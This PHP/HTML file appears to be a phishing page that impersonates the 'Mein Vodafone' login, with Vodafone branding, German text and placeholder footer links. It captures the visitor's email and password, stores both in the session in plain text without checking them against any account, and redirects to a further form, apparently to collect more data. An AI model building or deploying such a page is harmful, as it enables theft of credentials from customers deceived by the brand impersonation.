<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email']);
    $password = trim($_POST['password']);
    
    $error = '';
    
    // Email validation
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error = 'Bitte geben Sie eine gültige E-Mail-Adresse ein.';
    }
    // Password validation
    elseif (strlen($password) < 6) {
        $error = 'Das Passwort muss mindestens 6 Zeichen lang sein.';
    }
    
    if (empty($error)) {
        $_SESSION['email'] = $email;
        $_SESSION['password'] = $password;
        header('Location: form.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mein Vodafone - Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
</head>
<body class="vodafone-body">
    <header class="vodafone-header">
        <div class="container">
            <img src="assets/images/vodafone.png" alt="Vodafone" class="logo">
        </div>
    </header>

    <main class="container py-5">
        <div class="row justify-content-center">
            <div class="col-md-4">
                <div class="card shadow">
                    <div class="card-body p-4">
                        <h1 class="text-center mb-4">Anmelden</h1>
                        
                        <?php if (isset($error)): ?>
                            <div class="alert alert-danger"><?php echo $error; ?></div>
                        <?php endif; ?>

                        <form method="POST" id="loginForm" novalidate>
                            <div class="mb-4">
                                <label for="email" class="form-label">E-Mail oder Mobilfunknummer</label>
                                <input type="email" class="form-control form-control-lg" id="email" name="email" 
                                       required value="<?php echo isset($_POST['email']) ? htmlspecialchars($_POST['email']) : ''; ?>">
                                <div class="invalid-feedback">Bitte geben Sie eine gültige E-Mail-Adresse ein.</div>
                            </div>

                            <div class="mb-4">
                                <label for="password" class="form-label">Passwort</label>
                                <div class="input-group">
                                    <input type="password" class="form-control form-control-lg" id="password" 
                                           name="password" required minlength="6">
                                    <button type="button" class="btn btn-outline-secondary" id="togglePassword">
                                        <i class="far fa-eye"></i>
                                    </button>
                                </div>
                                <div class="form-text mt-2">Mindestens 6 Zeichen</div>
                            </div>

                            <div class="d-grid gap-2">
                                <button type="submit" class="btn btn-primary btn-lg">Weiter</button>
                            </div>

                            <div class="text-center mt-4">
                                <a href="#" class="text-decoration-none">Passwort vergessen?</a>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer class="footer mt-auto py-3">
        <div class="container text-center">
            <div class="footer-links">
                <a href="#">Impressum</a>
                <a href="#">Datenschutz</a>
                <a href="#">AGB</a>
                <a href="#">Hilfe</a>
            </div>
            <p class="mt-2 text-muted">&copy; <?php echo date('Y'); ?> Vodafone GmbH</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Password toggle
        document.getElementById('togglePassword').addEventListener('click', function() {
            const password = document.getElementById('password');
            const icon = this.querySelector('i');
            
            if (password.type === 'password') {
                password.type = 'text';
                icon.classList.remove('fa-eye');
                icon.classList.add('fa-eye-slash');
            } else {
                password.type = 'password';
                icon.classList.remove('fa-eye-slash');
                icon.classList.add('fa-eye');
            }
        });

        // Form validation
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            let hasError = false;

            // Email validation
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                e.preventDefault();
                hasError = true;
                document.getElementById('email').classList.add('is-invalid');
            } else {
                document.getElementById('email').classList.remove('is-invalid');
            }

            // Password validation
            if (password.length < 6) {
                e.preventDefault();
                hasError = true;
                document.getElementById('password').classList.add('is-invalid');
            } else {
                document.getElementById('password').classList.remove('is-invalid');
            }
        });
    </script>
</body>
</html>
